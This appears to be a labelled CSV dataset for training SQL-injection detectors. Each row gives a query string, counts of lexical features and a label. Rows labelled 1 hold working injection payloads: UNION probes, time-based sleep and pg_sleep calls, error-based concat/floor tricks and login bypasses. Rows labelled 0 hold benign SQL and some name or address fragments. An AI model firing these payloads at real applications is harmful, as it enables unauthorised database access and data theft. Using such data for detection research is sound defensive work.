Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",0,2,0,0,3,0,2,0,337,133,55,110,24,0,2,6,0,4,1
SELECT TOP 3 * FROM load WHERE several = 'film',0,0,0,0,0,0,1,0,47,9,1,15,0,0,0,0,2,0,0
"SELECT DAYOFWEEK ( ""2017-06-15 09:34:21"" ) ;",0,0,2,0,0,0,0,1,44,6,14,0,2,0,0,0,0,2,0
"1""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,2,0,0,0,1,0,195,84,25,53,19,1,0,3,0,1,1
c/ sant gonal 166 9-b,0,0,1,0,0,0,0,0,21,4,4,11,0,0,0,0,0,0,0
1'||  (  select 'yzdz' where 5021  =  5021,0,1,0,0,0,0,1,0,42,11,9,15,1,0,0,0,3,0,1
"1'  )   as yjdg where 5262  =  5262 union all select null,null,null#",0,0,0,0,1,0,1,0,68,16,9,37,1,3,0,2,1,0,1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_logo' LIMIT 1,0,0,0,0,0,0,1,0,87,11,1,47,0,0,0,0,2,0,0
SELECT COUNT ( happen )  FROM fair,0,0,0,0,0,0,0,0,34,7,0,10,2,0,0,0,0,0,0
SELECT * FROM personal WHERE sink = 'nation',0,0,0,0,0,0,1,0,44,7,0,18,0,0,0,0,2,0,0
SELECT COUNT ( impossibleID ) FROM belt,0,0,0,0,0,0,0,0,39,6,0,14,2,0,0,0,0,0,0
SELECT TOP 3 * FROM everybody SELECT * FROM treated 3SELECT * FROM river,0,0,0,0,0,0,0,0,72,13,2,21,0,0,0,0,0,0,0
SELECT * FROM beside ORDER BY yesterday,0,0,0,0,0,0,0,0,39,6,0,15,0,0,0,0,0,0,0
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0,0,0,0,0,0,0,0,72,12,0,25,0,0,0,0,0,0,0
"-4596"" union all select 5761#",0,0,1,0,1,0,0,0,29,4,8,14,0,0,0,0,0,1,1
"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",0,2,0,0,0,2,2,0,141,45,8,68,6,0,0,2,4,0,1
otxandio,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
calle nicolas funes 116,0,0,0,0,0,0,0,0,23,3,3,17,0,0,0,0,0,0,0
1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,0,1,1,0,0,0,1,0,117,50,10,43,9,0,0,0,1,0,1
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx",0,2,10,0,0,0,3,0,367,165,47,103,34,0,0,1,0,4,1
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dfxd' like 'dfxd",0,12,0,0,0,0,2,0,374,166,49,96,34,0,0,1,4,0,1
"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",0,2,0,0,0,0,2,0,89,48,21,9,8,0,0,1,0,0,1
"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,2,0,0,0,2,0,129,52,23,37,9,0,0,1,2,0,1
"c/ santa olaja, 121 2?d",0,0,0,0,0,1,0,0,23,4,4,12,0,0,0,1,0,0,0
SELECT television ( s )  FROM bill SELECT transportation ( s ) ,0,0,0,0,0,0,0,0,63,13,0,30,4,0,0,0,0,0,0
SELECT * FROM stranger WHERE brass = 'sudden' LIMIT 3,0,0,0,0,0,0,1,0,53,9,1,19,0,0,0,0,2,0,0
pelamen,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",0,1,0,0,0,0,1,0,118,39,14,49,8,1,0,3,3,0,1
"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,0,0,0,0,2,0,86,36,18,22,5,0,0,1,0,1,1
SELECT * FROM simple WHERE good NOT BETWEEN 'attempt' AND 'stems',0,0,0,0,0,0,0,0,65,10,0,22,0,0,0,0,4,0,0
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',0,0,0,0,0,0,2,0,73,14,0,28,0,0,0,0,4,0,0
"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",0,2,0,0,0,0,1,0,195,43,12,124,4,0,0,6,0,4,1
"1""  )   where 6823  =  6823 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,6,2,0,0,0,2,0,261,104,37,76,23,2,0,4,0,1,1
SELECT * FROM country FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM section,0,0,0,0,0,0,0,0,81,14,3,14,0,0,0,0,0,0,0
"1  )   and make_set  (  1559  =  4863,4863  )  ",0,1,0,0,0,0,1,0,47,18,13,10,3,0,0,1,0,0,1
"  SELECT sillyID AS ID, darkness AS depend FROM basis",0,0,0,0,0,0,0,0,53,10,0,24,0,0,0,1,0,0,0
SELECT * FROM softly WHERE ride = 'different' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,69,12,1,19,0,0,0,0,2,0,0
""" or """" """,0,1,0,0,0,0,0,0,9,3,0,2,0,0,0,0,0,4,1
SELECT * FROM Customers  WHERE CustomerID = 1;,0,0,0,0,0,0,1,1,46,8,1,15,0,0,0,0,0,0,0
33s4h9929r,0,0,0,0,0,0,0,0,10,0,7,3,0,0,0,0,0,0,0
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,4,2,0,0,0,2,0,163,64,24,48,12,0,0,1,1,0,1
hiplita,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT COUNT ( memory ) FROM organization,0,0,0,0,0,0,0,0,41,6,0,18,2,0,0,0,0,0,0
1  )   and 7533  =  7533,0,1,0,0,0,0,1,0,24,10,9,3,1,0,0,0,0,0,1
inund!ar,0,1,0,0,0,0,0,0,8,0,0,7,0,0,0,0,0,0,0
SELECT * FROM torn,0,0,0,0,0,0,0,0,18,3,0,4,0,0,0,0,0,0,0
3.59196E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"   SELECT age, greatest, drawFROM seldom WHERE full  IS NOT NULL",0,0,0,0,0,0,0,0,64,13,0,25,0,0,0,2,0,0,0
-6036   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  6723  =  6723,0,12,1,0,0,0,3,0,387,190,56,77,38,0,0,0,0,0,1
SELECT * FROM enough FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,53,9,2,6,0,0,0,0,0,0,0
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,0,1,0,0,0,0,1,0,52,24,10,13,4,0,0,0,0,0,1
"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",0,0,2,0,1,0,1,0,96,15,40,29,1,0,0,6,1,0,1
"  SELECT fellow,fact FROM manufacturing WHERE handsome = 'better' UNION SELECT fireplace, result FROM lamp",0,0,0,0,0,0,1,0,106,15,0,56,0,0,0,2,2,0,0
SELECT * FROM  ( SELECT bridge FROM system ) ,0,0,0,0,0,0,0,0,45,10,0,12,2,0,0,0,0,0,0
6196,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1,0,3,0,1,0,1,0,100,14,52,19,1,0,0,9,1,0,1
wilmont,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
SELECT * FROM color,0,0,0,0,0,0,0,0,19,3,0,5,0,0,0,0,0,0,0
"-2840'   )    )     )   union all select 3025,3025,3025,3025--",1,0,3,0,1,0,0,0,62,18,20,14,3,0,0,3,1,0,1
monti,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
glickman,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT COUNT ( DISTINCT no )  FROM there,0,0,0,0,0,0,0,0,40,8,0,7,2,0,0,0,0,0,0
errol@diseodesoftware.ml,0,0,0,0,0,1,0,0,24,0,0,22,0,0,0,0,0,0,0
intuitivo,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,0,3,0,1,0,0,0,92,18,44,14,3,0,0,9,1,0,1
FROM  ( SELECT DISTINCT species FROM identity ) ,0,0,0,0,0,0,0,0,48,9,0,15,2,0,0,0,0,0,0
"1""  )   where 1212  =  1212 and 8475  =  5864",0,1,0,0,0,0,2,0,45,16,17,8,1,0,0,0,0,1,1
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,0,1,0,0,0,0,1,0,114,44,13,46,6,0,1,0,4,0,1
SELECT TOP 3 * FROM be,0,0,0,0,0,0,0,0,22,5,1,2,0,0,0,0,0,0,0
SELECT inch ( s FROM tool RIGHT JOIN,0,0,0,0,0,0,0,0,36,7,0,9,1,0,0,0,0,0,0
"c/ el columpio 13,",0,0,0,0,0,0,0,0,18,3,2,11,0,0,0,1,0,0,0
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",0,2,0,0,0,0,2,0,59,20,13,17,2,0,0,1,4,0,1
WHERE Country IN  ( SELECT Country FROM Suppliers ) ;,0,0,0,0,0,0,0,1,53,10,0,20,2,0,0,0,0,0,0
1'  )   as mzby where 6530  =  6530,0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,1,0,1
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1,1,2,0,1,0,1,0,87,29,3,43,3,0,0,1,2,1,1
"INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ",0,0,0,0,0,0,0,0,88,18,0,40,4,0,0,4,6,0,0
ohala,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
SELECT * FROM pen WHERE straight = 'deep'  OR eventually = 'its',0,0,0,0,0,0,2,0,64,12,0,28,0,0,0,0,4,0,0
"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",0,2,0,0,0,0,2,0,56,20,13,14,2,0,0,0,0,4,1
"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1,0,3,0,1,0,1,0,103,16,48,25,1,0,0,8,1,0,1
SELECT map ( s )  FROM outside LEFT JOIN,0,0,0,0,0,0,0,0,40,9,0,11,2,0,0,0,0,0,0
"   SELECT COUNT ( roll ) , field FROM die BY are",0,0,0,0,0,0,0,0,48,13,0,15,2,0,0,1,0,0,0
" SELECT column_name ( s )  FROM herd,scientist",0,0,0,0,0,0,0,0,46,8,0,24,2,0,0,1,0,0,0
SELECT AVG ( storm ) FROM zulu SELECT SUM ( origin ) ,0,0,0,0,0,0,0,0,53,12,0,15,4,0,0,0,0,0,0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,0,15,0,0,0,0,2,0,428,189,51,116,40,0,0,0,4,0,1
"   SELECT Employees.poet, COUNT ( Orders.townID )  AS shallowFROM    ( OrdersINNER JOIN spent ON Orders.passageID  =  Employees.valuableID ) ",0,0,0,0,0,0,1,0,141,26,0,66,4,0,0,1,0,0,0
"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",1,1,3,0,1,0,1,0,105,17,36,37,1,0,0,5,3,0,1
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0,0,0,0,0,0,1,0,54,11,0,21,0,0,0,0,2,0,0
"  SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  ",0,0,0,0,0,0,0,0,74,17,0,26,2,0,0,2,6,0,0
42855301e,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'ydxb'  =  'ydxb",0,5,0,0,0,0,2,0,152,60,16,48,12,0,0,1,4,0,1
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',0,2,0,0,0,2,1,0,72,44,2,11,8,0,0,0,4,0,1
1'  )   as twny where 9580  =  9580,0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,1,0,1
SELECT TOP 50 PERCENT * FROM cook,0,0,0,0,0,0,0,0,33,6,2,4,0,0,0,0,0,0,0
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',0,1,0,0,0,2,2,0,141,74,13,34,12,0,1,0,4,0,1
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",0,0,1,0,1,0,0,0,66,18,24,14,3,0,0,4,1,0,1
"INSERT INTO medicine  ( expression, sides, everything )  VALUES  ( 'wore', 'travel', 'rice' )  ",0,0,0,0,0,0,0,0,95,18,0,47,4,0,0,4,6,0,0
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,2,0,0,0,1,0,70,31,10,19,5,0,0,0,0,1,1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",0,2,0,0,0,0,2,0,136,37,8,75,4,0,0,2,0,4,1
"1%"" and sleep  (  5  )  #",0,1,0,0,0,1,0,0,25,10,2,8,2,0,0,0,0,1,1
" end and   (  ""%""  =  """,0,1,0,0,0,1,1,0,23,11,0,6,1,0,0,0,0,3,1
SELECT * FROM exact WHERE consist NOT BETWEEN 'political' AND 'introduced',0,0,0,0,0,0,0,0,74,10,0,31,0,0,0,0,4,0,0
6.87721E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,0,15,0,0,0,0,3,0,417,183,51,112,38,0,0,0,4,0,1
1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',0,2,0,0,0,2,2,0,112,61,10,22,10,0,0,0,4,0,1
"-9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  --",1,1,3,0,0,0,2,0,82,32,24,16,4,0,0,1,0,0,1
"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,1,0,0,0,2,0,221,85,45,68,14,0,2,3,1,0,1
SELECT COUNT ( DISTINCT certainly )  FROM environment,0,0,0,0,0,0,0,0,53,8,0,20,2,0,0,0,0,0,0
1'+  (  select 'hcqf' where 9956  =  9956 and   (  2993  =  4297  )  *4297  )  +',0,1,2,0,0,0,2,0,81,29,21,18,4,0,0,0,4,0,1
SELECT TOP 3 * FROM save,0,0,0,0,0,0,0,0,24,5,1,4,0,0,0,0,0,0,0
"1""  )   as axua where 6718  =  6718",0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,0,1,1
SELECT AVG ( ice ) FROM nine SELECT SUM ( fairly ) ,0,0,0,0,0,0,0,0,51,12,0,13,4,0,0,0,0,0,0
palls de buran,0,0,0,0,0,0,0,0,14,2,0,12,0,0,0,0,0,0,0
SELECT AVG ( spider ) FROM group SELECT SUM ( appropriate ) ,0,0,0,0,0,0,0,0,60,12,0,22,4,0,0,0,0,0,0
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,2,0,0,0,1,0,65,27,10,19,4,0,0,0,0,1,1
8.7027E+15,0,0,1,0,0,0,0,0,10,0,7,0,0,0,0,0,0,0,0
1%'  )   union all select null--,1,0,2,0,1,1,0,0,32,8,1,18,1,1,0,0,1,0,1
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil""; DROP VIEW [Brazil Customers];",0,0,0,0,0,0,1,2,111,15,0,54,2,0,0,2,0,2,0
bartholo,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
santibez el bajo,0,0,0,0,0,0,0,0,16,2,0,14,0,0,0,0,0,0,0
SELECT * FROM port WHERE yourself = 'season' LIMIT 3,0,0,0,0,0,0,1,0,52,9,1,18,0,0,0,0,2,0,0
" SELECT * FROM average ORDER BY sure, find",0,0,0,0,0,0,0,0,42,8,0,15,0,0,0,1,0,0,0
waitfor delay '0:0:5' and   (  '%'  =  ',0,1,0,0,0,1,1,0,40,12,3,15,1,0,0,0,5,0,1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",0,1,0,0,0,0,1,0,122,31,8,71,4,0,0,2,1,0,1
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui",0,7,0,0,0,0,1,0,256,98,29,86,22,2,0,4,4,0,1
"  SELECT buy,them FROM changing WHERE difference = 'major' UNION SELECT dead, tightly FROM hang",0,0,0,0,0,0,1,0,95,15,0,45,0,0,0,2,2,0,0
caete,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
lohr@show.nom.ad,0,0,0,0,0,1,0,0,16,0,0,13,0,0,0,0,0,0,0
caravaca de la cruz,0,0,0,0,0,0,0,0,19,3,0,16,0,0,0,0,0,0,0
SELECT COUNT ( grain ) FROM kept,0,0,0,0,0,0,0,0,32,6,0,9,2,0,0,0,0,0,0
" select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",1,2,2,0,0,1,2,0,59,20,4,26,0,0,0,0,0,2,1
SELECT orbit ( s )  FROM east LEFT JOIN,0,0,0,0,0,0,0,0,39,9,0,10,2,0,0,0,0,0,0
" SELECT * FROM own ORDER BY highest, improve",0,0,0,0,0,0,0,0,44,8,0,17,0,0,0,1,0,0,0
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,1,0,0,0,1,0,206,83,37,63,15,0,2,3,0,1,1
37759460s,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
8.27854E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT TOP 3 * FROM nearer SELECT * FROM visitor 3SELECT * FROM purple,0,0,0,0,0,0,0,0,70,13,2,19,0,0,0,0,0,0,0
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1,0,2,0,0,0,2,0,118,50,21,36,7,0,1,0,0,0,1
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",0,12,1,0,0,0,3,0,367,170,48,85,34,0,0,0,0,4,1
8.00405E+14,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
85510378n,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
SELECT hello FROM swam UNION ALL SELECT dot FROM everybody ORDER BY occur,0,0,0,0,0,0,0,0,73,12,0,26,0,0,0,0,0,0,0
etchieso,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3,0,0,0,0,0,0,1,0,55,9,1,21,0,0,0,0,2,0,0
5.12155E+14,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",0,0,0,0,1,0,0,0,77,18,1,46,3,8,0,7,1,0,1
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,0,0,0,0,1,0,52,24,10,10,4,0,0,1,1,0,1
SELECT TOP 3 * FROM foreign,0,0,0,0,0,0,0,0,27,5,1,7,0,0,0,0,0,0,0
"admin""  )   or ""1""  =  ""1""#",0,1,0,0,0,0,1,0,27,10,2,7,1,0,0,0,0,5,1
"oso, el",0,0,0,0,0,0,0,0,7,1,0,5,0,0,0,1,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_doing_cron' LIMIT 1,0,0,0,0,0,0,1,0,97,11,1,55,0,0,0,0,2,0,0
SELECT * FROM breath FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,53,9,2,6,0,0,0,0,0,0,0
" SELECT * FROM discovery ORDER BY hollow, guess",0,0,0,0,0,0,0,0,47,8,0,20,0,0,0,1,0,0,0
SELECT * FROM almost WHERE substance = 'garage' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,71,12,1,21,0,0,0,0,2,0,0
SELECT flew ( s )  FROM only UNION,0,0,0,0,0,0,0,0,34,8,0,9,2,0,0,0,0,0,0
baily,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
"  SELECT blind AS equator, answer AS [driving]  FROM charge",0,0,0,0,0,0,0,0,59,11,0,31,2,0,0,1,0,0,0
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,0,2,11,0,0,0,1,0,364,170,50,92,36,0,0,0,4,0,1
uvalle urpina,0,0,0,0,0,0,0,0,13,1,0,12,0,0,0,0,0,0,0
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,2,2,0,0,1,2,0,55,18,5,24,0,0,0,0,0,0,1
SELECT * FROM spend WHERE highway = 'organized' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,71,12,1,21,0,0,0,0,2,0,0
40197,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT becoming ( s )  FROM terrible UNION,0,0,0,0,0,0,0,0,42,8,0,17,2,0,0,0,0,0,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,2,2,0,0,0,2,0,59,20,5,26,0,0,0,0,0,2,1
SELECT * FROM trouble WHERE organization = 'bottom' FETCH FIRST 3 ROWS ONLY,0,0,0,0,0,0,1,0,75,12,1,25,0,0,0,0,2,0,0
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",0,1,0,0,1,0,1,0,80,15,9,45,1,4,0,3,3,0,1
"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",0,1,2,0,0,0,2,0,161,48,16,79,6,0,0,2,2,0,1
"1""  )   as mibc where 3113  =  3113",0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,0,1,1
SELECT difference ( s )  FROM where SELECT human ( s ) ,0,0,0,0,0,0,0,0,55,13,0,22,4,0,0,0,0,0,0
3151,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",0,1,2,0,0,0,2,0,290,111,79,64,20,0,3,6,4,0,1
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,2,0,0,0,2,0,169,51,17,82,6,0,0,3,0,1,1
"select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--",1,0,2,0,0,0,1,0,110,32,19,48,4,0,0,2,0,0,1
presencio,0,0,0,0,0,0,0,0,9,0,0,9,0,0,0,0,0,0,0
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'qdij'  =  'qdij",0,2,10,0,0,0,3,0,367,165,47,103,34,0,0,1,4,0,1
